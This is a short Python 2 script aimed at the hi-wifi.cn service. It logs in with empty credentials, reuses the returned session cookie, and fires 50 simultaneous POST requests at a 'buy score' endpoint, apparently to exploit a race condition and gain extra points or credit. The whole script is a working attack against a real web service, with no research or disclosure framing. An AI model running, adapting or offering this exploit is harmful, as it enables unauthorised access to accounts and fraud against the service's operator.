# -*- coding:utf-8 -*-
import sys
import requests
import threading
reload(sys)
sys.setdefaultencoding('utf-8')
url='http://api.hi-wifi.cn/user/login?uname=&pwd='
r=requests.get(url)
data=r.json()
seid=data.get("msg")
print 'seid=',seid
def worker():
    cookies=dict(seid=seid)
    url='http://m.hi-wifi.cn/user/buy/score'
    data=dict(score=2)
    rr=requests.post(url,cookies=cookies,data=data)
    #print rr.text
    print rr

for i in xrange(50):
    t=threading.Thread(target=worker)
    t.start()
